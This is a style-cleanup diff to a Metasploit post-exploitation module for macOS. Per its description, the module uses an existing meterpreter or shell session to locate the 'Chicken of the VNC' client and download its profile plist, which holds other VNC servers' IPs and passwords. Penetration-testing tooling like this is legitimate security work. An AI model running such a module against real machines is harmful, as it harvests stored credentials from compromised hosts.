@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,23 +8,20 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'OS X Gather Chicken of the VNC Profile',
-      'Description'   => %q{
-        This module will download the "Chicken of the VNC" client application's
-        profile file,	which is used to store other VNC servers' information such
-        as as the	IP and password.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "meterpreter", "shell" ]
-    ))
-
+                      'Name'          => 'OS X Gather Chicken of the VNC Profile',
+                      'Description'   => %q(
+                        This module will download the "Chicken of the VNC" client application's
+                        profile file,	which is used to store other VNC servers' information such
+                        as as the	IP and password.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'sinn3r'],
+                      'Platform'      => [ 'osx' ],
+                      'SessionTypes'  => [ "meterpreter", "shell" ]))
   end
 
   def whoami
@@ -57,7 +55,7 @@ class MetasploitModule < Msf::Post
     subdirs = exec("ls -l #{path}")
     return [] if subdirs =~ /No such file or directory/
     items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
-    return items
+    items
   end
 
   def locate_chicken
@@ -66,7 +64,7 @@ class MetasploitModule < Msf::Post
       return true
     end
 
-    return false
+    false
   end
 
   def get_profile_plist(user)
@@ -94,7 +92,7 @@ class MetasploitModule < Msf::Post
     @peer = "#{session.session_host}:#{session.session_port}"
     user = whoami
 
-    if not locate_chicken
+    if !locate_chicken
       print_error("#{@peer} - Chicken of the VNC is not installed")
       return
     else
@@ -105,8 +103,7 @@ class MetasploitModule < Msf::Post
     if plist.nil?
       print_error("No profile plist found")
     else
-      save(plist) if not plist.nil?
+      save(plist) unless plist.nil?
     end
   end
-
 end
